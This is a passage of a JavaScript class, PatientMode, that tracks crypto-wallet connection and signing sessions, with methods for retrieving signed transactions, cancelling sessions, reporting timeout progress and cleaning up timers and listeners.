  getSignedTransaction(sessionId) {
    const session = this.activeSessions.get(sessionId);
    return session ? session.signedTransaction : null;
  }

  // Cleanup session and all associated resources
  cleanupSession(sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) return;
    
    console.log(`[PATIENT_MODE] Cleaning up session ${sessionId} for ${session.walletType}`);
    
    // Clear intervals
    if (session.pollInterval) {
      clearTimeout(session.pollInterval);
    }
    if (session.statusInterval) {
      clearInterval(session.statusInterval);
    }
    
    // Remove event listeners
    session.eventListeners.forEach(cleanup => {
      try {
        cleanup();
      } catch (error) {
        console.error(`[PATIENT_MODE] Error during event listener cleanup:`, error);
      }
    });
    
    // Remove session
    this.activeSessions.delete(sessionId);
  }

  // Get active sessions count
  getActiveSessionsCount() {
    return this.activeSessions.size;
  }

  // Get session information
  getSessionInfo(sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) return null;
    
    const elapsed = Date.now() - session.startTime;
    const maxTime = session.type === 'connection' ? 
      this.timeouts.PATIENT_CONNECTION_TIMEOUT : 
      this.timeouts.PATIENT_SIGNING_TIMEOUT;
    
    return {
      ...session,
      elapsed,
      remaining: Math.max(0, maxTime - elapsed),
      progress: Math.min(100, (elapsed / maxTime) * 100)
    };
  }

  // Cancel a specific session
  cancelSession(sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) return false;
    
    console.log(`[PATIENT_MODE] Cancelling session ${sessionId} for ${session.walletType}`);
    this.cleanupSession(sessionId);
    return true;
  }

  // Cancel all sessions
  cancelAllSessions() {
    const sessionIds = Array.from(this.activeSessions.keys());
    sessionIds.forEach(sessionId => this.cancelSession(sessionId));
    console.log(`[PATIENT_MODE] Cancelled ${sessionIds.length} active sessions`);
  }

  // Get timeout configuration
  getTimeouts() {
    return { ...this.timeouts };
  }

  // Update timeout configuration
  updateTimeouts(newTimeouts) {
    this.timeouts = { ...this.timeouts, ...newTimeouts };
    console.log(`[PATIENT_MODE] Updated timeout configuration:`, this.timeouts);
  }

  // Comprehensive cleanup
  cleanup() {
    this.cancelAllSessions();
    console.log(`[PATIENT_MODE] Complete cleanup performed`);
  }
}

// PatientMode class is now available globally
